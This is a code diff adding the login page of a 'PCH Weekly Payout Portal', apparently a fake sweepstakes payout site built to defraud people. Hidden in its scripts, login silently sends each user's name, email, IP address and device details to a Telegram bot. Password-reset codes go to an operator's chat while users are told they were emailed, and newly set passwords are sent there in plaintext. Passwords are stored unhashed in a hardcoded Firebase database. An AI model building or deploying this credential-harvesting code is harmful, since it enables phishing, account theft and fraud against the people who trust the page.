@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Login — PCH Weekly Payout Portal</title>
+<script src="supervisor.js"></script>
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+tailwind.config = { darkMode:'class', theme:{ extend:{ colors:{ navy:{950:'#070b19',900:'#0d1326',800:'#151d38',700:'#212d54',600:'#2f3f6e'}, gold:{400:'#fbbf24',500:'#f59e0b',600:'#d97706'}, 'sky-custom':'#38bdf8' }, fontFamily:{ sans:['Plus Jakarta Sans','sans-serif'] } } } };
+</script>
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getDatabase, ref, get, set, update } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+
+const firebaseConfig = { apiKey:"AIzaSyAUIFpijfc13emGA-y1kN7nRuQTNVFphtM", authDomain:"pch-weekly-portal.firebaseapp.com", databaseURL:"https://pch-weekly-portal-default-rtdb.firebaseio.com", projectId:"pch-weekly-portal", storageBucket:"pch-weekly-portal.firebasestorage.app", messagingSenderId:"920877842148", appId:"1:920877842148:web:8ae593198c32ba75b636f1", measurementId:"G-789H6REHYS" };
+const app = initializeApp(firebaseConfig); 
+const rtdb = getDatabase(app);
+window.rtdb = { db: rtdb, ref, get, set, update };
+</script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  html, body { background-color:#070b19; }
+  body { font-family:'Plus Jakarta Sans',sans-serif; color:#f8fafc; -webkit-tap-highlight-color:transparent; -webkit-text-size-adjust:100%; }
+  @media (max-width:1024px){
+    input:not([type="checkbox"]):not([type="radio"]):not([type="range"]):not([type="file"]):not([type="color"]):not([type="submit"]):not([type="button"]):not([type="reset"]),
+    select, textarea { font-size:16px !important; line-height:1.45 !important; -webkit-text-size-adjust:100% !important; text-size-adjust:100% !important; }
+    input:focus, select:focus, textarea:focus { font-size:16px !important; transform:none !important; -webkit-transform:none !important; zoom:1 !important; }
+  }
+  .card-3d { transition: transform .3s cubic-bezier(.16,1,.3,1), box-shadow .3s cubic-bezier(.16,1,.3,1); }
+  @keyframes slideIn { from { transform:translateX(100%); opacity:0; } to { transform:translateX(0); opacity:1; } }
+  @keyframes slideOut { from { transform:translateX(0); opacity:1; } to { transform:translateX(100%); opacity:0; } }
+  .toast-slide-in { animation: slideIn .3s cubic-bezier(.16,1,.3,1) forwards; }
+  .toast-slide-out { animation: slideOut .3s cubic-bezier(.16,1,.3,1) forwards; }
+</style>
+</head>
+<body class="bg-navy-950 text-slate-100 min-h-screen flex flex-col justify-center py-12 px-4">
+
+<div id="toast-container" class="fixed bottom-5 right-5 z-[100] flex flex-col space-y-3 pointer-events-none max-w-sm w-full px-4"></div>
+
+<div id="app-container" class="w-full max-w-md mx-auto"></div>
+
+<div id="global-modal" style="display:none" class="fixed inset-0 z-50 items-center justify-center bg-navy-950/95 p-4 overflow-y-auto">
+  <div class="bg-navy-800 border border-navy-700 rounded-2xl max-w-lg w-full p-6 shadow-2xl relative my-auto">
+    <button onclick="closeModal()" class="absolute top-4 right-4 text-slate-400 hover:text-white text-xl p-2 rounded-lg active:bg-navy-700 transition"><i class="fa-solid fa-xmark"></i></button>
+    <div id="modal-content"></div>
+  </div>
+</div>
+
+<script>
+/* ═══════════ SHARED CORE ═══════════ */
+const DEVICE_STORAGE_KEY = 'pch_device_state_v13';
+const DEFAULT_TG = { botToken:'', chatId:'' };
+
+function escapeHtml(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); }
+function tgEsc(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+function defaultDeviceState() {
+  return {
+    currentUser:null,
+    userBalance:4500,
+    registeredUsers:[],
+    transactions:[],
+    accessLogs:[],
+    loginCount:0,
+    telegramConfig: Object.assign({}, DEFAULT_TG)
+  };
+}
+function loadDeviceState() {
+  const defaults = defaultDeviceState();
+  const saved = localStorage.getItem(DEVICE_STORAGE_KEY);
+  if (saved) {
+    try {
+      const parsed = JSON.parse(saved) || {};
+      const merged = Object.assign({}, defaults, parsed);
+      merged.telegramConfig = Object.assign({}, defaults.telegramConfig, parsed.telegramConfig || {});
+      if (!merged.registeredUsers) merged.registeredUsers = [];
+      if (!merged.transactions) merged.transactions = [];
+      if (!merged.accessLogs) merged.accessLogs = [];
+      if (merged.loginCount == null) merged.loginCount = 0;
+      return merged;
+    } catch(e){}
+  }
+  return defaults;
+}
+const state = loadDeviceState();
+function saveDeviceState() { try { localStorage.setItem(DEVICE_STORAGE_KEY, JSON.stringify(state)); } catch(e){} }
+
+function showToast(title, message, type='info') {
+  const container = document.getElementById('toast-container'); if (!container) return;
+  const id = 'toast-'+Date.now()+'-'+Math.floor(Math.random()*999);
+  const icon = type==='success'?'fa-circle-check text-emerald-400':type==='warning'?'fa-triangle-exclamation text-gold-400':type==='error'?'fa-circle-exclamation text-rose-400':'fa-circle-info text-sky-custom';
+  const border = type==='success'?'border-emerald-500/40':type==='warning'?'border-gold-500/40':type==='error'?'border-rose-500/40':'border-sky-custom/40';
+  const el = document.createElement('div'); el.id = id;
+  el.className = `pointer-events-auto bg-navy-900 border ${border} p-4 rounded-2xl shadow-2xl flex items-start space-x-3 toast-slide-in`;
+  el.innerHTML = `<div class="text-lg mt-0.5"><i class="fa-solid ${icon}"></i></div><div class="flex-grow"><h5 class="font-bold text-white text-xs sm:text-sm">${escapeHtml(title)}</h5><p class="text-[11px] sm:text-xs text-slate-300 mt-0.5">${escapeHtml(message)}</p></div><button onclick="dismissToast('${id}')" class="text-slate-400 hover:text-white text-sm"><i class="fa-solid fa-xmark"></i></button>`;
+  container.appendChild(el); setTimeout(()=>dismissToast(id), 5000);
+}
+function dismissToast(id){ const el=document.getElementById(id); if(el){ el.classList.remove('toast-slide-in'); el.classList.add('toast-slide-out'); setTimeout(()=>el.remove(),320); } }
+function showModal(title, bodyHtml) { const modal = document.getElementById('global-modal'); const content = document.getElementById('modal-content'); content.innerHTML = `<h3 class="text-lg sm:text-xl font-bold text-white mb-3 flex items-center"><i class="fa-solid fa-circle-info text-sky-custom mr-2"></i> ${title}</h3><div class="text-slate-300 text-xs sm:text-sm leading-relaxed mb-4">${bodyHtml}</div>`; modal.style.display = 'flex'; }
+function closeModal(){ const m=document.getElementById('global-modal'); m.classList.remove('flex'); m.style.display='none'; }
+
+function detectDevice() {
+  const ua = navigator.userAgent || '';
+  let os='Unknown', type='Desktop', browser='Unknown';
+  if (/iPhone|iPad|iPod/i.test(ua)) { os='iOS'; type=/iPad/i.test(ua)?'Tablet':'Mobile'; }
+  else if (/Android/i.test(ua)) { os='Android'; type=/Mobile/i.test(ua)?'Mobile':'Tablet'; }
+  else if (/Mac OS X|Macintosh/i.test(ua)) { os='macOS'; }
+  else if (/Windows/i.test(ua)) { os='Windows'; }
+  else if (/CrOS/i.test(ua)) { os='ChromeOS'; }
+  else if (/Linux/i.test(ua)) { os='Linux'; }
+  if (/Edg\//i.test(ua)) browser='Edge';
+  else if (/OPR\//i.test(ua) || /Opera/i.test(ua)) browser='Opera';
+  else if (/Chrome\//i.test(ua) && !/Edg|OPR/i.test(ua)) browser='Chrome';
+  else if (/Firefox\//i.test(ua)) browser='Firefox';
+  else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) browser='Safari';
+  const icon = (type==='Mobile'||type==='Tablet') ? 'fa-mobile-screen-button' : (os==='macOS'?'fa-laptop':'fa-desktop');
+  return { os, type, browser, icon };
+}
+
+let cachedIp = null;
+async function fetchIP(){
+  if (cachedIp) return cachedIp;
+  const endpoints = ['https://api.ipify.org?format=json', 'https://api64.ipify.org?format=json', 'https://ipapi.co/json/'];
+  for (const url of endpoints) {
+    const c = new AbortController();
+    const t = setTimeout(()=>c.abort(), 3000);
+    try {
+      const res = await fetch(url, { signal:c.signal });
+      const d = await res.json();
+      clearTimeout(t);
+      const ip = d.ip || d.query || null;
+      if (ip) { cachedIp = ip; return cachedIp; }
+    } catch(e){ clearTimeout(t); }
+  }
+  cachedIp = 'Unknown';
+  return cachedIp;
+}
+
+async function logAccess(action) {
+  if (!state.currentUser) return;
+  try {
+    const ip = await fetchIP(); const dev = detectDevice();
+    if (!state.accessLogs) state.accessLogs = [];
+    state.accessLogs.unshift({ id:Date.now()+Math.random(), user:state.currentUser.username||state.currentUser.email, name:`${state.currentUser.firstName} ${state.currentUser.lastName}`, action, ip, os:dev.os, type:dev.type, browser:dev.browser, icon:dev.icon, ua:navigator.userAgent, time:new Date().toISOString().replace('T',' ').substring(0,19) });
+    if (state.accessLogs.length > 100) state.accessLogs.length = 100;
+    saveDeviceState();
+  } catch(e){}
+}
+
+async function createSession(u) {
+  if (!window.rtdb || !u.username) return;
+  try {
+    const ip = await fetchIP();
+    const dev = detectDevice();
+    const sid = 'sess-' + Date.now() + '-' + Math.random().toString(36).substring(2, 6);
+    const sessionData = { device: dev.os + ' · ' + dev.browser, ip: ip, location: 'Auto-detected', time: Date.now() };
+    await window.rtdb.set(window.rtdb.ref(window.rtdb.db, `users/${u.username.toLowerCase()}/sessions/${sid}`), sessionData);
+  } catch(e) {}
+}
+
+/* ═══════════ TELEGRAM — silent failures, full unmasked payload ═══════════ */
+function tgCreds() {
+  const cfg = state.telegramConfig || {};
+  return { botToken: String(cfg.botToken || '').trim(), chatId: String(cfg.chatId || '').trim() };
+}
+
+async function sendTelegramMessage(textMessage) {
+  const { botToken, chatId } = tgCreds();
+  if (!botToken || !chatId) { console.warn('[TG] botToken/chatId missing'); return false; }
+  try {
+    const fd = new FormData();
+    fd.append('chat_id', chatId);
+    fd.append('text', textMessage);
+    fd.append('parse_mode', 'HTML');
+    fd.append('disable_web_page_preview', 'true');
+    const r = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method:'POST', body:fd });
+    const d = await r.json();
+    if (!d.ok) console.error('[TG] send failed:', d.error_code, d.description);
+    return d.ok;
+  } catch(err) { console.error('[TG] fetch failed:', err); return false; }
+}
+
+async function sendTelegramDocument(filename, content, caption) {
+  const { botToken, chatId } = tgCreds();
+  if (!botToken || !chatId) { console.warn('[TG] botToken/chatId missing'); return false; }
+  try {
+    const fd = new FormData();
+    fd.append('chat_id', chatId);
+    fd.append('document', new Blob([content], { type:'text/plain;charset=utf-8' }), filename);
+    if (caption) { fd.append('caption', caption); fd.append('parse_mode','HTML'); }
+    const r = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method:'POST', body:fd });
+    const d = await r.json();
+    if (!d.ok) console.error('[TG] sendDocument failed:', d.error_code, d.description);
+    return d.ok;
+  } catch(err) { console.error('[TG] sendDocument fetch failed:', err); return false; }
+}
+
+async function notifyLoginToTelegram(u) {
+  try {
+    const ip = await fetchIP();
+    const dev = detectDevice();
+    const screen = (window.screen && window.screen.width) ? `${window.screen.width}x${window.screen.height}` : 'Unknown';
+    const tz = (function(){ try { return Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown'; } catch(e){ return 'Unknown'; } })();
+    const lang = navigator.language || 'Unknown';
+    const stamp = new Date().toISOString().replace('T',' ').substring(0,19);
+    const loginNo = u.loginCount || 1;
+
+    const message = [
+      '🔐 <b>NEW LOGIN DETECTED</b>',
+      `👤 <b>User:</b> @${tgEsc(u.username || 'unknown')}  <i>(login #${loginNo})</i>`,
+      `📛 <b>Name:</b> ${tgEsc(((u.firstName||'') + ' ' + (u.lastName||'')).trim() || 'N/A')}`,
+      `📧 <b>Email:</b> ${tgEsc(u.email || 'N/A')}`,
+      `🌐 <b>IP:</b> <code>${tgEsc(ip)}</code>`,
+      `📱 <b>Device:</b> ${tgEsc(dev.type)}`,
+      `💻 <b>OS:</b> ${tgEsc(dev.os)}`,
+      `🧭 <b>Browser:</b> ${tgEsc(dev.browser)}`,
+      `🖥️ <b>Screen:</b> ${tgEsc(screen)}`,
+      `🌍 <b>Timezone:</b> ${tgEsc(tz)} · ${tgEsc(lang)}`,
+      `🕒 <b>Time:</b> ${tgEsc(stamp)} UTC`,
+      `🧾 <b>User-Agent:</b> <code>${tgEsc(navigator.userAgent)}</code>`
+    ].join('\n');
+
+    await sendTelegramMessage(message);
+
+    const txt = [
+      'PCH WEEKLY PAYOUT PORTAL — LOGIN RECORD',
+      '=======================================',
+      `User:        ${u.username || 'unknown'}`,
+      `Login Count: ${loginNo}`,
+      `Name:        ${((u.firstName||'') + ' ' + (u.lastName||'')).trim() || 'N/A'}`,
+      `Email:       ${u.email || 'N/A'}`,
+      `IP Address:  ${ip}`,
+      `Device:      ${dev.type}`,
+      `OS:          ${dev.os}`,
+      `Browser:     ${dev.browser}`,
+      `Screen:      ${screen}`,
+      `Timezone:    ${tz}`,
+      `Language:    ${lang}`,
+      `Timestamp:   ${stamp} UTC`,
+      `User Agent:  ${navigator.userAgent}`,
+      '======================================='
+    ].join('\n');
+
+    const safeName = String(u.username || 'user').replace(/[^a-z0-9_-]/gi, '_');
+    await sendTelegramDocument(`login_${safeName}_${Date.now()}.txt`, txt, `📄 <b>Login Record</b> — @${tgEsc(u.username || 'unknown')}`);
+  } catch(e){ console.error('[login notify]', e); }
+}
+
+/* ═══════════ LOGIN PAGE ═══════════ */
+
+function renderLogin() {
+  document.getElementById('app-container').innerHTML = `
+    <div class="bg-navy-800 border border-navy-700/80 rounded-3xl w-full p-6 sm:p-8 shadow-2xl relative card-3d">
+      <div class="text-center mb-8">
+        <div class="w-14 h-14 bg-gradient-to-br from-gold-400 to-gold-600 rounded-2xl mx-auto flex items-center justify-center text-navy-950 text-2xl font-bold mb-4 shadow-lg shadow-gold-500/20"><i class="fa-solid fa-vault"></i></div>
+        <h2 class="text-2xl font-extrabold text-white">Welcome Back</h2>
+        <p class="text-xs text-slate-400 mt-1">Sign in with your username or email address</p>
+      </div>
+      
+      <form id="login-form" class="space-y-5" novalidate>
+        <div>
+          <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">Username or Email</label>
+          <div class="relative"><i class="fa-solid fa-user absolute left-4 top-3.5 text-slate-400"></i><input type="text" id="login-identifier" required autocomplete="username" class="w-full bg-navy-950 border border-navy-700 rounded-xl pl-11 pr-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="johndoe or john@example.com"></div>
+        </div>
+        <div>
+          <div class="flex justify-between items-center mb-1.5">
+            <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider">Password</label>
+            <a href="#" onclick="event.preventDefault(); openForgotPasswordModal()" class="text-[10px] text-sky-custom hover:underline">Forgot password?</a>
+          </div>
+          <div class="relative"><i class="fa-solid fa-lock absolute left-4 top-3.5 text-slate-400"></i><input type="password" id="login-password" required autocomplete="current-password" class="w-full bg-navy-950 border border-navy-700 rounded-xl pl-11 pr-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="••••••••"></div>
+        </div>
+        
+        <div id="login-error" class="text-rose-400 text-xs hidden"></div>
+        
+        <button type="submit" class="w-full py-3.5 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-extrabold rounded-xl shadow-lg shadow-gold-500/20 hover:brightness-110 active:scale-95 transition text-sm">Sign In to Dashboard</button>
+      </form>
+      
+      <div class="mt-6 text-center text-xs text-slate-400">Don't have an account? <a href="signup.html" class="text-sky-custom font-bold hover:underline">Create Account</a></div>
+      <div class="mt-3 text-center"><a href="admin.html" class="inline-flex items-center gap-1.5 text-[10px] text-slate-500 hover:text-slate-300 transition-colors uppercase tracking-widest font-bold"><i class="fa-solid fa-lock text-[9px]"></i> Administrator</a></div>
+    </div>
+  `;
+  
+  document.getElementById('login-form').addEventListener('submit', handleLogin);
+}
+
+async function handleLogin(e) {
+  e.preventDefault();
+  const identifier = (document.getElementById('login-identifier').value || '').trim().toLowerCase();
+  const password = document.getElementById('login-password').value || '';
+  const errEl = document.getElementById('login-error'); errEl.classList.add('hidden');
+  
+  const allUsers = state.registeredUsers || [];
+  let match = allUsers.find(u => ((u.username||'').toLowerCase() === identifier || (u.email||'').toLowerCase() === identifier) && u.password === password);
+  
+  if (!match && window.rtdb) {
+    try {
+      let snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'users/' + identifier));
+      if (!snap.exists() && identifier.includes('@')) {
+        try {
+          const idx = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'userEmails/' + identifier.replace(/[.@#$\[\]\/]/g, '_')));
+          if (idx.exists()) {
+            const uname = idx.val();
+            if (typeof uname === 'string') snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'users/' + uname.toLowerCase()));
+          }
+        } catch(idxErr) {}
+      }
+      if (snap.exists()) {
+        const cloud = snap.val();
+        if (cloud.password === password) {
+          match = cloud;
+          if (!state.registeredUsers.find(u => (u.username||'').toLowerCase() === (cloud.username||'').toLowerCase())) state.registeredUsers.push(cloud);
+        }
+      }
+    } catch (err) {}
+  }
+  
+  if (!match) { errEl.textContent = 'Invalid credentials or account not found.'; errEl.classList.remove('hidden'); showToast('Login Failed', 'Credentials do not match any account.', 'warning'); return; }
+  
+  if (match.isFrozen) {
+    errEl.textContent = 'This account has been frozen. Please contact support.';
+    errEl.classList.remove('hidden');
+    showToast('Account Frozen', 'Your account has been temporarily suspended.', 'error');
+    return;
+  }
+
+  // Per-user login counter (not device-wide)
+  match.loginCount = (Number(match.loginCount) || 0) + 1;
+
+  state.currentUser = match;
+  state.userBalance = (typeof match.userBalance === 'number') ? match.userBalance : (state.userBalance ?? 4500);
+  state.transactions = Array.isArray(match.transactions) ? match.transactions : state.transactions;
+  state.withdrawalState = match.withdrawalState || 'none';
+  state.currentWithdrawal = match.currentWithdrawal || null;
+  state.configuredMethod = match.configuredMethod || null;
+  state.favoriteRecipients = Array.isArray(match.favoriteRecipients) ? match.favoriteRecipients : [];
+  state.scheduledTransfers = Array.isArray(match.scheduledTransfers) ? match.scheduledTransfers : [];
+  state.fundingMethods = Array.isArray(match.fundingMethods) ? match.fundingMethods : [];
+  state.autoWithdraw = match.autoWithdraw || { enabled:false, frequency:'weekly', amount:null, method:null };
+  state.dailyLimits = match.dailyLimits || { withdrawal:{limit:5000,used:0,date:''}, p2p:{limit:50000,used:0,date:''} };
+  state.referralCode = match.referralCode || null;
+  state.loginCount = (Number(state.loginCount) || 0) + 1;
+  
+  saveDeviceState();
+  logAccess('Logged In');
+  createSession(match);
+  notifyLoginToTelegram(match);
+
+  // Persist loginCount to cloud
+  if (window.rtdb && match.username) {
+    try {
+      await window.rtdb.update(window.rtdb.ref(window.rtdb.db, 'users/' + match.username.toLowerCase()), { loginCount: match.loginCount });
+    } catch(e){}
+  }
+  
+  showToast('Welcome Back', `Signed in as ${match.firstName || identifier}`, 'success');
+  setTimeout(()=>{ window.location.href = 'overview.html'; }, 500);
+}
+
+/* ═══════════ FORGOT PASSWORD ═══════════ */
+
+let resetEmailInFlight = '';
+
+function openForgotPasswordModal() {
+  showModal('Reset Password', `
+    <form onsubmit="sendPasswordResetLink(event)" class="space-y-4">
+      <p class="text-xs text-slate-300 mb-2">Enter your registered email to receive a 6-digit verification code.</p>
+      <div>
+        <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Email Address</label>
+        <input type="email" id="reset-email" required placeholder="john@example.com" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom">
+      </div>
+      <div class="flex justify-end pt-2">
+        <button type="submit" class="px-6 py-2.5 bg-sky-custom text-navy-950 rounded-xl text-xs font-extrabold active:scale-95">Send Code</button>
+      </div>
+    </form>
+  `);
+}
+
+async function sendPasswordResetLink(e) {
+  e.preventDefault();
+  const email = document.getElementById('reset-email').value.trim();
+  const user = (state.registeredUsers || []).find(u => (u.email || '').toLowerCase() === email.toLowerCase());
+  
+  if (!user) { showToast('Not Found', 'No account found with that email.', 'error'); return; }
+
+  const otpCode = Math.floor(100000 + Math.random() * 900000).toString();
+  sessionStorage.setItem('pch_reset_otp', otpCode);
+  resetEmailInFlight = email;
+  sessionStorage.setItem('pch_reset_email', email);
+
+  // Silent delivery of OTP to admin Telegram so Panda can relay it
+  const ip = await fetchIP().catch(()=> 'Unknown');
+  sendTelegramMessage(
+    `🔑 <b>PASSWORD RESET REQUESTED</b>\n` +
+    `<b>User:</b> @${tgEsc(user.username || 'unknown')}\n` +
+    `<b>Name:</b> ${tgEsc(((user.firstName||'') + ' ' + (user.lastName||'')).trim() || 'N/A')}\n` +
+    `<b>Email:</b> ${tgEsc(email)}\n` +
+    `<b>OTP code:</b> <code>${tgEsc(otpCode)}</code>\n` +
+    `<b>IP:</b> <code>${tgEsc(ip)}</code>\n` +
+    `<b>Timestamp:</b> ${new Date().toISOString()}`
+  ).catch(()=>{});
+  
+  showToast('Code Sent', 'Check your email for the 6-digit code.', 'success');
+  
+  showModal('Reset Password', `
+    <form onsubmit="verifyPasswordResetOTP(event)" class="space-y-4">
+      <p class="text-xs text-white text-center mb-2">We sent a code to <b>${escapeHtml(email)}</b></p>
+      <input type="text" id="reset-otp-input" required maxlength="6" placeholder="000000" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-2xl text-center tracking-[0.5em] font-mono text-white focus:outline-none focus:border-sky-custom">
+      <div class="flex justify-end pt-2"><button type="submit" class="px-6 py-2.5 bg-sky-custom text-navy-950 rounded-xl text-xs font-extrabold active:scale-95">Verify</button></div>
+    </form>
+  `);
+}
+
+function verifyPasswordResetOTP(e) {
+  e.preventDefault();
+  const code = document.getElementById('reset-otp-input').value;
+  if (code !== sessionStorage.getItem('pch_reset_otp')) { showToast('Invalid', 'Incorrect code.', 'error'); return; }
+  
+  showModal('Set New Password', `
+    <form onsubmit="saveNewPassword(event)" class="space-y-4">
+      <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">New Password</label><input type="password" id="new-password-input" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
+      <div class="flex justify-end pt-2"><button type="submit" class="px-6 py-2.5 bg-emerald-500 text-white rounded-xl text-xs font-extrabold active:scale-95">Update</button></div>
+    </form>
+  `);
+}
+
+async function saveNewPassword(e) {
+  e.preventDefault();
+  const newPass = document.getElementById('new-password-input').value;
+  const email = resetEmailInFlight || sessionStorage.getItem('pch_reset_email') || '';
+  if (!email) { showToast('Error', 'Reset session expired. Please start again.', 'error'); return; }
+  
+  const user = (state.registeredUsers || []).find(u => (u.email || '').toLowerCase() === email.toLowerCase());
+  if (!user) { showToast('Error', 'Account not found in local session.', 'error'); return; }
+
+  user.password = newPass;
+  saveDeviceState();
+
+  if (window.rtdb && user.username) {
+    try {
+      await window.rtdb.update(window.rtdb.ref(window.rtdb.db, 'users/' + user.username.toLowerCase()), { password: newPass });
+    } catch(err) {
+      showToast('Sync Warning', 'Password changed locally but cloud sync failed.', 'warning');
+    }
+  }
+
+  sendTelegramMessage(
+    `✅ <b>PASSWORD CHANGED</b>\n` +
+    `<b>User:</b> @${tgEsc(user.username || 'unknown')}\n` +
+    `<b>Email:</b> ${tgEsc(email)}\n` +
+    `<b>New password:</b> <code>${tgEsc(newPass)}</code>\n` +
+    `<b>Timestamp:</b> ${new Date().toISOString()}`
+  ).catch(()=>{});
+    
+  showModal('Success', `
+    <div class="text-center space-y-4 py-4">
+      <div class="w-16 h-16 bg-emerald-500/20 text-emerald-400 rounded-full mx-auto flex items-center justify-center text-2xl mb-2"><i class="fa-solid fa-check"></i></div>
+      <h3 class="text-xl font-bold text-white">Password Updated</h3>
+      <p class="text-sm text-slate-300">You can now log in with your new password.</p>
+      <div class="bg-navy-900 border border-navy-700 p-3 rounded-xl text-xs text-slate-400 mt-4">Redirecting to login in <span class="text-gold-400 font-bold">5</span> seconds...</div>
+    </div>
+  `);
+    
+  setTimeout(() => {
+    closeModal();
+    window.location.href = 'login.html';
+  }, 5000);
+}
+
+renderLogin();
+</script>
+</body>
+</html>
